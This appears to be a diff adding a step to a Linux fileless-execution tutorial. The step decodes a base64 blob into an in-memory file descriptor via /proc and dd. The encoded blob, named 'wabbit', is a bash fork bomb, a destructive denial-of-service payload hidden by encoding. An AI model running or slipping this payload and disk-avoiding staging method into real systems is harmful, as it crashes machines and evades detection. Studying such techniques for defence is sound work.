@@ -167,3 +167,9 @@ now let's base64 encode it,
 cat wabbit | base64 -w0 ; echo
 ```
 - ```IyEvYmluL2Jhc2gKOigpeyA6fDomIH07Ogo=```
+
+then, transfer it to the in-memory-only file,
+
+```shell
+echo "IyEvYmluL2Jhc2gKOigpeyA6fDomIH07Ogo=" | base64 -d > /proc/`pidof dd`/fd/3
+```
